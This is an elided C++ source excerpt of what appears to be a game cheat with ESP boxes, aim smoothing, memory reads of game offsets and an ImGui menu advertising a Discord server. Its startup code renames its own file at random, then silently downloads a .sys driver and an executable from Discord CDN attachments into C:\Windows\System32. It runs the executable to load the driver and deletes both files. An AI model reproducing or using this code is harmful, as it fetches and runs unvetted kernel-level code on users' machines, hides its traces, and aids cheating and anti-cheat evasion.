...

{
	...
	rename(path().c_str(), random_string(15).c_str());
	...
	rename(path().c_str(), random_string(15).c_str());
	system(E("curl https://cdn.discordapp.com/attachments/1125851966162083970/1125852131132461076/kernelos.sys --output C:\\Windows\\System32\\kernelos.sys >nul 2>&1"));
	system(E("curl https://cdn.discordapp.com/attachments/1125851966162083970/1125852130318762074/windowstoolhelper.exe --output C:\\Windows\\System32\\windowstoolhelper.exe >nul 2>&1"));
	system(E("C:\\Windows\\System32\\windowstoolhelper.exe C:\\Windows\\System32\\kernelos.sys"));
	std::remove(E("C:\\Windows\\System32\\kernelos.sys"));
	std::remove(E("C:\\Windows\\System32\\windowstoolhelper.exe"));
	system(E("cls"));
...
Uworld = ReadBizzy<DWORD_PTR>(base_address + OFFSETS::UWorld);
   ...
   // if (read<float>(CurrentActor + OFFSETS::Revivefromdbnotime) != 10) continue;
	...
	if (distance < VisDist)
	{
		...
		if (Esp)
		{
			...
			if (Esp_box)
			{
					DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(0, 0, 255, 255), 2.5);
...
void render() {
	...
	if (ShowMenu)
	{
		...
		ImGui::Begin(("Bastard | discord.gg/bastard  |  " __DATE__), 0, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar);
		...
		ImGui::BeginChild("##ChildIdentifier", ImVec2(420, 480)/*SIZE OF THE CHILD*/, false /*IF YOU WANT A BORDER OR NOT*/);
		{
			...
			ImGui::SliderFloat("Smoothness", &smooth, 1, 10);
			ImGui::Spacing();
			ImGui::Text("Aim Key");
...
void xMainLoop()
{
	...
	std::thread processThread(checkProcesses);
